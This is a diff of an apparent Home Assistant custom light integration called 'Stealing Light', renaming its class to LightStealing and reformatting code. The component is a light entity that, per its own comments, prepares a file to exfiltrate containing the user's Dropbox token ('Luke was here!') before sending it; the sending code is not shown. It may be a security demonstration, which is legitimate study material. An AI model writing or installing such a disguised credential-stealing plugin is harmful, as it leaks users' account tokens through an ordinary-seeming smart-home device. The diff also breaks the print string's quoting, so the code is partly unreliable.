@@ -22,28 +22,28 @@ def setup_platform(
     discovery_info: DiscoveryInfoType | None = None,
 ) -> None:
 
-    """Set up the Stealingh Light platform."""
+    """Set up the Stealing Light platform."""
 
     if UPLOAD_KEY in config:
-        lights = [StealingLight(config[UPLOAD_KEY])]
+        lights = [LightStealing(config[UPLOAD_KEY])]
     else:
-        lights = [StealingLight()]
+        lights = [LightStealing()]
     add_entities(lights)
 
 
-class StealingLight(LightEntity):
+class LightStealing(LightEntity):
     """Representation of a Stealing Light."""
 
     _target = "switch.exfiltration_switch"
 
     def __init__(self, upload: bool = False) -> None:
-        """Initialize a StealingLight."""
+        """Initialize a LightStealing."""
         self._light = LightEntity()
-        self._name = "Stealing Light"
+        self._name = "Light Stealing"
         self._brightness = None
         self._state = False
         self._upload = upload
-        print('Light "' + self._name + '" was created.')
+        print(self._name + '" was created.')
 
     @property
     def name(self) -> str:
@@ -107,13 +107,8 @@ class StealingLight(LightEntity):
 
             # preparing the file to exfiltrate
             tmp_file = open(filename, "w", encoding="utf-8")
-            tmp_file.write(
-                "At "
-                + current_time
-                + ' Luke was here! (Thanks to your dropbox token: "'
-                + dropbox_token
-                + '")'
-            )
+            text_to_write = "At " + current_time + ' Luke was here! (Thanks to your dropbox token: "' + dropbox_token + '")'
+            tmp_file.write(text_to_write)
             tmp_file.close()
 
             # Sending file
